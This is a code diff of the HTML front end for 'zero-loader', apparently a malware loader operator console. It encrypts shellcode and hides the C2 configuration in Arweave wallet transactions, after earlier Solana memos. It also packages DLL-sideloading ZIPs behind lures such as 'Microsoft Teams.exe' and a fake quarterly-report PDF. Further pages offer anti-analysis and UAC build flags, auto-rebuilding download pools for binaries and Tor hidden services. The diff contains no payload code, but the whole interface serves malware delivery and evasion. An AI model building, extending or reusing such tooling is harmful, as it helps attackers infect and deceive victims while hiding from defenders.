@@ -15,19 +15,16 @@
     <span class="title">zero-loader</span>
     <span class="subtitle">console</span>
   </div>
-  <div class="status-bar">
-    <span class="pill" id="pill-payload">Payload.h —</span>
-    <span class="pill" id="pill-sideload">Sideload.h —</span>
-    <span class="pill warn">127.0.0.1 only</span>
-  </div>
 </header>
 
 <!-- ═══════════════════════════ page nav ══════════════════════════ -->
 <nav class="page-nav">
   <button class="page-btn active" data-page="build">◼ Build</button>
-  <button class="page-btn" data-page="sideload">⬡ Sideload</button>
-  <button class="page-btn" data-page="donut">◈ Donut</button>
-  <button class="page-btn" data-page="solana">◆ Solana</button>
+  <button class="page-btn" data-page="sideload">⬡ Bind Files</button>
+  <button class="page-btn" data-page="donut">◈ Stub</button>
+  <button class="page-btn" data-page="arweave">◆ Wallet</button>
+  <button class="page-btn" data-page="pools">⬢ Pools</button>
+  <button class="page-btn" data-page="tor">⬡ Tor</button>
 </nav>
 
 <!-- ═══════════════════════════ pages ═════════════════════════════ -->
@@ -49,19 +46,16 @@
         <section class="panel active" id="panel-encrypt">
           <div class="panel-head">
             <h2>Encrypt shellcode</h2>
-            <p>Runs <code>Encrypt.py</code>. Produces <code>data.enc</code> (upload to your staging server)
-            and a <strong>decrypt key</strong> you combine with your staging URL at publish time.
-            The binary only embeds the wallet address — URL and key live on-chain.</p>
+            <p>Runs <code>Encrypt.py</code>. Compresses and encrypts the payload, producing
+            <code>data.enc</code> and a decrypt key. Select an Arweave wallet to embed its address
+            in <code>Payload.h</code> now — then hit <strong>⚡ Upload</strong> in the history row
+            to publish to Arweave without re-selecting a wallet.</p>
           </div>
           <form id="form-encrypt" class="form">
 
-            <!-- Shellcode source -->
+            <!-- Shellcode source (Donut workspace only) -->
             <div class="field">
               <span>Shellcode</span>
-              <div class="src-toggle">
-                <label class="src-opt"><input type="radio" name="sc_src" value="workspace" checked> From Donut workspace</label>
-                <label class="src-opt"><input type="radio" name="sc_src" value="upload"> Upload file</label>
-              </div>
               <div class="cdd" id="enc-sc-job-wrap">
                 <button type="button" class="cdd-trigger">
                   <span class="cdd-display">— no successful Donut jobs yet —</span>
@@ -70,24 +64,20 @@
                 <div class="cdd-list hidden"></div>
               </div>
               <input type="hidden" id="enc-sc-job" value="">
-              <input type="file" id="enc-sc-file" name="shellcode" class="hidden-src">
             </div>
 
             <!-- Wallet selector -->
             <div class="field">
-              <span>Beacon wallet</span>
-              <div class="cdd" id="enc-wallet-sel-wrap">
+              <span>Arweave wallet</span>
+              <div class="cdd" id="enc-wallet-wrap">
                 <button type="button" class="cdd-trigger">
-                  <span class="cdd-display">— select from Solana workspace —</span>
+                  <span class="cdd-display">— select a wallet —</span>
                   <span class="cdd-arrow">▾</span>
                 </button>
                 <div class="cdd-list hidden"></div>
               </div>
-              <input type="hidden" id="enc-wallet-sel" value="">
-              <input type="text" name="sol_wallet" id="enc-wallet"
-                     placeholder="Or paste base58 address manually (32–44 chars)"
-                     pattern="[1-9A-HJ-NP-Za-km-z]{32,44}"
-                     autocomplete="off" spellcheck="false">
+              <input type="hidden" id="enc-wallet-id" value="">
+              <span style="font-size:11px;color:var(--text-mute)">Wallet address is embedded in <code>Payload.h</code> — the C loader uses it to find your transactions on Arweave at runtime.</span>
             </div>
 
             <div class="actions">
@@ -98,11 +88,6 @@
 
           <pre class="console" id="out-encrypt"></pre>
 
-
-          <details class="preview-wrap">
-            <summary>Payload.h preview (first 4 KB)</summary>
-            <pre class="preview" id="preview-payload"></pre>
-          </details>
 
           <!-- Encrypt History -->
           <div class="history-section" id="encrypt-history-section">
@@ -135,6 +120,35 @@
               </label>
             </div>
 
+            <fieldset class="field">
+              <legend>Compile-time flags</legend>
+              <label class="check"><input type="checkbox" name="uac" id="bld-uac">       <span>UAC — <code>/MANIFESTUAC</code> (EXE) or self-elevation (DLL)</span></label>
+              <label class="check"><input type="checkbox" name="rwx" id="bld-rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
+              <label class="check"><input type="checkbox" name="debug" id="bld-debug">   <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
+              <label class="check"><input type="checkbox" name="synthetic" id="bld-syn"> <span>ENABLE_SYNTHETIC_STACK — Draugr RSP swap (opt-in)</span></label>
+            </fieldset>
+
+            <!-- Payload.h source -->
+            <div class="field">
+              <span>Payload.h <em>— select from encrypt history</em></span>
+              <div class="cdd" id="bld-payload-sel-wrap">
+                <button type="button" class="cdd-trigger">
+                  <span class="cdd-display">— use existing Payload.h in project root —</span>
+                  <span class="cdd-arrow">▾</span>
+                </button>
+                <div class="cdd-list hidden"></div>
+              </div>
+              <input type="hidden" id="bld-payload-sel" value="">
+            </div>
+
+            <!-- EXE output name (EXE mode only) -->
+            <label class="field" id="field-exe-name">
+              <span>Output filename <em>(optional)</em></span>
+              <input type="text" id="bld-exe-name" placeholder="msoia.exe"
+                     autocomplete="off" spellcheck="false">
+              <span style="font-size:11px;color:var(--text-mute)">Defaults to <code>msoia.exe</code>. Must end in <code>.exe</code>.</span>
+            </label>
+
             <!-- sideload config — shown only in sideload mode -->
             <div id="field-sideload-config" class="hidden">
 
@@ -155,14 +169,20 @@
               <div class="row">
                 <label class="field">
                   <span>Original DLL rename <em>(optional)</em></span>
-                  <input type="text" id="sl-dll-rename" placeholder="target_orig.dll"
-                         autocomplete="off" spellcheck="false">
+                  <div class="filename-wrap">
+                    <input type="text" id="sl-dll-rename" placeholder="target_orig"
+                           autocomplete="off" spellcheck="false">
+                    <span class="file-ext">.dll</span>
+                  </div>
                   <span style="font-size:11px;color:var(--text-mute)">Forwarding target inside Sideload.h. Defaults to <code>target_orig.dll</code>.</span>
                 </label>
                 <label class="field">
                   <span>Host EXE rename in ZIP <em>(optional)</em></span>
-                  <input type="text" id="sl-host-rename" placeholder="e.g. Microsoft Teams.exe"
-                         autocomplete="off" spellcheck="false">
+                  <div class="filename-wrap">
+                    <input type="text" id="sl-host-rename" placeholder="e.g. Microsoft Teams"
+                           autocomplete="off" spellcheck="false">
+                    <span class="file-ext">.exe</span>
+                  </div>
                 </label>
               </div>
 
@@ -175,38 +195,25 @@
 
               <label class="field">
                 <span>Bind file name in ZIP <em>(optional)</em></span>
-                <input type="text" id="sl-bind-rename" placeholder="e.g. Quarterly Report Q1 2025.pdf"
-                       autocomplete="off" spellcheck="false">
+                <div class="filename-wrap">
+                  <input type="text" id="sl-bind-rename" placeholder="e.g. Quarterly Report Q1 2025"
+                         autocomplete="off" spellcheck="false">
+                  <span class="file-ext" id="sl-bind-rename-ext"></span>
+                </div>
               </label>
 
               <label class="field">
                 <span>ZIP output name <em>(required)</em></span>
-                <input type="text" id="sl-zip-name" placeholder="deploy.zip"
-                       autocomplete="off" spellcheck="false" required>
+                <div class="filename-wrap">
+                  <input type="text" id="sl-zip-name" placeholder="deploy"
+                         autocomplete="off" spellcheck="false">
+                  <span class="file-ext">.zip</span>
+                </div>
                 <span style="font-size:11px;color:var(--text-mute)">
                   ZIP: <strong>proxy DLL</strong> (hidden) · <strong>original DLL</strong> (hidden) · <strong>host EXE</strong> · <em>_\bind file</em> (if set).
                 </span>
               </label>
 
-            </div>
-            <fieldset class="field">
-              <legend>Compile-time flags</legend>
-              <label class="check"><input type="checkbox" name="uac" id="bld-uac">       <span>UAC — <code>/MANIFESTUAC</code> (EXE) or self-elevation (DLL)</span></label>
-              <label class="check"><input type="checkbox" name="rwx" id="bld-rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
-              <label class="check"><input type="checkbox" name="debug" id="bld-debug">   <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
-              <label class="check"><input type="checkbox" name="synthetic" id="bld-syn"> <span>ENABLE_SYNTHETIC_STACK — Draugr RSP swap (opt-in)</span></label>
-            </fieldset>
-            <!-- Payload.h source -->
-            <div class="field">
-              <span>Payload.h <em>— select from encrypt history</em></span>
-              <div class="cdd" id="bld-payload-sel-wrap">
-                <button type="button" class="cdd-trigger">
-                  <span class="cdd-display">— use existing Payload.h in project root —</span>
-                  <span class="cdd-arrow">▾</span>
-                </button>
-                <div class="cdd-list hidden"></div>
-              </div>
-              <input type="hidden" id="bld-payload-sel" value="">
             </div>
 
             <div class="actions">
@@ -252,7 +259,7 @@
       </div>
 
       <!-- build profiles -->
-      <div class="sb-section" style="margin-top:16px">
+      <div class="sb-section">
         <div class="sb-head">
           <h3>Build Profiles</h3>
           <button class="btn-sm" id="btn-show-save-bld-profile">Save</button>
@@ -268,7 +275,7 @@
       </div>
 
       <!-- artifacts -->
-      <div class="sb-section" style="margin-top:20px">
+      <div class="sb-section">
         <div class="sb-head">
           <h3>Artifacts</h3>
         </div>
@@ -331,13 +338,13 @@
 </div><!-- #page-sideload -->
 
 
-<!-- ─────────────────── PAGE 3 · Donut ─────────────────────────── -->
+<!-- ─────────────────── PAGE 3 · Stub ─────────────────────────── -->
 <div class="page" id="page-donut">
   <div class="mgmt-layout">
 
     <aside class="mgmt-list">
       <div class="mgmt-list-head">
-        <h3>CONVERSION HISTORY</h3>
+        <h3>STUB HISTORY</h3>
       </div>
       <div id="donut-history" class="mgmt-items-scroll">
         <p class="empty-note" id="donut-empty">No conversions yet.</p>
@@ -383,8 +390,8 @@
 </div><!-- #page-donut -->
 
 
-<!-- ─────────────────── PAGE 3 · Solana ─────────────────────────── -->
-<div class="page" id="page-solana">
+<!-- ─────────────────── PAGE 4 · Arweave ─────────────────────────── -->
+<div class="page" id="page-arweave">
   <div class="mgmt-layout">
 
     <aside class="mgmt-list">
@@ -418,6 +425,11 @@
               <div class="wallet-panel-addr" id="wp-addr"></div>
               <button class="btn-xs" id="btn-copy-addr" title="Copy address">Copy</button>
             </div>
+            <div class="wallet-balance-row">
+              <span class="wp-balance-label">Balance:</span>
+              <span class="wp-balance" id="wp-balance">—</span>
+              <button class="btn-xs" id="btn-refresh-balance" title="Refresh balance">↻</button>
+            </div>
           </div>
           <div class="wallet-panel-btns">
             <button class="btn-sm" id="btn-wallet-rename">Rename</button>
@@ -435,41 +447,35 @@
 
         <div class="wallet-actions-grid">
 
-          <!-- publish -->
+          <!-- upload to arweave -->
           <div class="wallet-action-card">
-            <h4>Publish memo</h4>
-            <p class="section-desc">Posts memo on-chain as an SPL Memo transaction.
-               Paste the contents of the memo from the Encrypt tab, or use the
-               quick-publish button there.</p>
-            <form id="form-publish" class="form">
+            <h4>Upload to Arweave</h4>
+            <p class="section-desc">Standalone upload — provide the <code>data.enc</code>
+               produced by Encrypt.py. The key is already embedded in the file.
+               Use <strong>⚡ Upload</strong> in Encrypt History for one-click publish.</p>
+            <div class="form">
               <label class="field">
-                <span>Memo text</span>
-                <textarea name="memo" id="wp-memo" rows="3"
-                  placeholder="https://c2.example.com/x.dat|key|nonce|size|compressed"
-                  spellcheck="false" autocomplete="off" required></textarea>
+                <span>data.enc file</span>
+                <input type="file" id="wp-dat-file" accept=".enc">
               </label>
               <div class="actions">
-                <button type="submit" class="primary">Publish on-chain</button>
-                <span class="hint">~0.000005 SOL per tx. Wallet must be funded.</span>
+                <button type="button" id="btn-arweave-upload" class="primary">Upload to Arweave</button>
+                <span class="hint">Wallet must hold AR tokens. Upload may take ~30 s.</span>
               </div>
-            </form>
+            </div>
             <pre class="console" id="out-publish"></pre>
           </div>
 
-          <!-- lookup -->
+          <!-- scan wallet transactions -->
           <div class="wallet-action-card">
-            <h4>Look up memo</h4>
+            <h4>Scan Wallet Transactions</h4>
             <p class="section-desc">
-              Read SPL Memo transactions from this wallet.<br>
-              <strong>Latest</strong> — most recent memo (what you last published).<br>
-              <strong>Beacon mode</strong> — oldest tx ever sent from this wallet.
-              This is what the <em>compiled loader reads at runtime</em>:
-              the binary finds its C2 config by looking up the very first transaction
-              from the embedded wallet address.
+              Queries <code>arweave.net/graphql</code> for the 10 most recent transactions
+              <em>from</em> this wallet (cryptographic owner filter) and tries to parse each
+              as a meta JSON. Mirrors exactly what the compiled loader does at runtime.
             </p>
-            <div class="actions" style="margin-top:0;margin-bottom:0;gap:8px">
-              <button id="btn-lookup-latest" class="primary btn-sm">Get Latest Memo</button>
-              <button id="btn-lookup-beacon" class="btn-sm">Get Beacon Memo (oldest)</button>
+            <div class="actions" style="margin-top:0;margin-bottom:0">
+              <button id="btn-lookup-tx" class="primary btn-sm">Scan Transactions</button>
             </div>
             <pre class="console" id="out-lookup"></pre>
           </div>
@@ -479,7 +485,110 @@
 
     </div><!-- .mgmt-detail -->
   </div>
-</div><!-- #page-solana -->
+</div><!-- #page-arweave -->
+
+<!-- ─────────────────── PAGE 5 · Pools ─────────────────────────── -->
+<div class="page" id="page-pools">
+  <div class="pool-page">
+
+    <!-- header + create button -->
+    <div class="pool-page-head">
+      <div>
+        <h2>Download Pools</h2>
+        <p class="pool-page-desc">Each pool serves ready-built binaries at <code>/d/&lt;slug&gt;</code> and
+          automatically rebuilds to maintain inventory. Expose only <code>/d/</code> via nginx; keep
+          <code>/api/pools/</code> restricted to localhost.</p>
+      </div>
+      <button class="btn-sm primary" id="btn-pool-new">+ New Pool</button>
+    </div>
+
+    <!-- create / edit form (hidden until needed) -->
+    <div id="pool-form-wrap" class="pool-form hidden">
+      <h3 id="pool-form-title">New Pool</h3>
+      <div class="pool-form-fields">
+        <label class="field">
+          <span>Name</span>
+          <input type="text" id="pf-name" placeholder="My Pool" autocomplete="off">
+        </label>
+        <label class="field">
+          <span>Slug <em>(URL path: /d/slug)</em></span>
+          <input type="text" id="pf-slug" placeholder="pool1" autocomplete="off" spellcheck="false">
+          <span class="field-hint">Lowercase alphanum + hyphens, 1–30 chars. Immutable after creation.</span>
+        </label>
+        <label class="field">
+          <span>Build profile</span>
+          <select id="pf-profile-sel" class="select-field"></select>
+        </label>
+        <label class="field">
+          <span>Target ready count</span>
+          <input type="number" id="pf-target" value="10" min="1" max="50">
+        </label>
+      </div>
+      <div class="actions">
+        <button class="btn-sm primary" id="btn-pool-form-confirm">Create</button>
+        <button class="btn-sm" id="btn-pool-form-cancel">Cancel</button>
+      </div>
+      <p class="pool-form-error hidden" id="pool-form-error"></p>
+    </div>
+
+    <!-- pool list -->
+    <div id="pool-list">
+      <p class="empty-note" id="pool-list-empty">No pools yet. Click <strong>+ New Pool</strong> to create one.</p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ─────────────────── PAGE 6 · Tor ─────────────────────────── -->
+<div class="page" id="page-tor">
+  <div class="tor-page">
+
+    <!-- status bar -->
+    <div class="tor-status-bar" id="tor-status-bar">
+      <div class="tor-dot" id="tor-dot"></div>
+      <span class="tor-status-label" id="tor-status-label">—</span>
+      <span class="tor-status-meta" id="tor-status-meta"></span>
+      <div class="tor-btns">
+        <button class="btn-sm primary" id="btn-tor-start">▶ Start</button>
+        <button class="btn-sm" id="btn-tor-stop" style="color:var(--err);border-color:var(--err)">■ Stop</button>
+        <button class="btn-sm" id="btn-tor-restart" style="color:var(--warn);border-color:var(--warn)">↺ Restart</button>
+        <button class="btn-sm" id="btn-tor-refresh">↻</button>
+      </div>
+    </div>
+
+    <!-- hidden services -->
+    <div class="tor-section">
+      <div class="tor-section-title">Hidden Services</div>
+      <div id="tor-service-list"><p class="empty-note">Loading…</p></div>
+    </div>
+
+    <!-- change port -->
+    <div class="tor-section">
+      <div class="tor-section-title">Change Hidden Service Port</div>
+      <div class="tor-port-form">
+        <label class="field" style="max-width:220px">
+          <span>Virtual port</span>
+          <input type="text" id="tor-vport" value="80" placeholder="80">
+        </label>
+        <label class="field" style="max-width:280px">
+          <span>Target (host:port)</span>
+          <input type="text" id="tor-target" value="127.0.0.1:7890" placeholder="127.0.0.1:7890">
+        </label>
+        <div class="actions" style="margin-top:0">
+          <button class="btn-sm primary" id="btn-tor-port">Apply</button>
+          <span class="hint" id="tor-port-msg"></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- log -->
+    <div class="tor-section">
+      <div class="tor-section-title">Tor Log <button class="btn-sm" id="btn-tor-log-refresh" style="margin-left:8px;font-size:10px">↻ Reload</button></div>
+      <pre class="console" id="tor-log-box" style="height:260px;overflow-y:auto;font-size:11px"></pre>
+    </div>
+
+  </div>
+</div>
 
 </div><!-- .pages -->
 
